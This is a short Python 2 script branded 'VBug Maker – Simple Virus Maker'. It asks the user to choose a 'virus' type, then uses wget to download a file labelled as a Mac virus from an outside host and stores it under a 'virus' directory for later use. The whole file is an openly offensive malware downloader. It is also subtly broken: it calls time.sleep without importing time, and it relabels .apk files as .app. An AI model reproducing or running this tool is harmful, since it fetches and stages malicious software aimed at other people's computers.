import os, sys
R = '\x1b[1;31m'
N = '\x1b[0m'
Y = '\x1b[1;33m'
G = '\x1b[1;37m'
print '%s+---------------------------------------------------+%s' % (R, N)
print '%s||[#]%s--------------%s[ VBug Maker ]%s---------------%s[#]||%s' % (Y, R, Y, R, Y, N)
print '%s||%s |___________%s[ Simple Virus Maker ]%s____________|%s ||%s' % (Y, R, Y, R, Y, N)
print '%s||%s |____________%s[ MACvima--Session ]%s_____________|%s ||%s' % (Y, R, Y, R, Y, N)
print '%s+---------------------------------------------------+%s' % (R, N)
print
type_of_virus = raw_input(' %s[%s*%s] %s(%sT%s)%srinoids %s| %s(%sN%s)%sothing %s:%s ' % (Y, R, Y, R, Y, R, G, Y, R, Y, R, G, R, Y))
if type_of_virus == 'T' or type_of_virus == 't':
    print '\n %s[%s+%s]%s Download The MAC Virus...%s' % (Y, R, Y, G, N)
    os.system('wget -q http://override.waper.co/files/trinoids.apk')
    os.system('mkdir virus/TRINOIDS;mv trinoids.apk virus/TRINOIDS/trinoids.app')
    print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
    sys.exit()
else:
    if type_of_virus == 'N' or type_of_virus == 'n':
        print '\n %s[%s+%s]%s Download The MAC Virus...%s' % (Y, R, Y, G, N)
        os.system('wget -q http://override.waper.co/files/nothing.apk')
        os.system('mkdir virus/nothing;mv nothing.apk virus/nothing/nothing.app')
        print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
        sys.exit()
    else:
        print '%s[%s%s]%s ERROR%s:%s Wrong Input...%s' % (Y, R, Y, R, Y, G, N)
        time.sleep(2)
        print '%s[%s!%s]%s ERROR%s:%s Exit the Program...%s' % (Y, R, Y, R, Y, G, N)
        sys.exit()
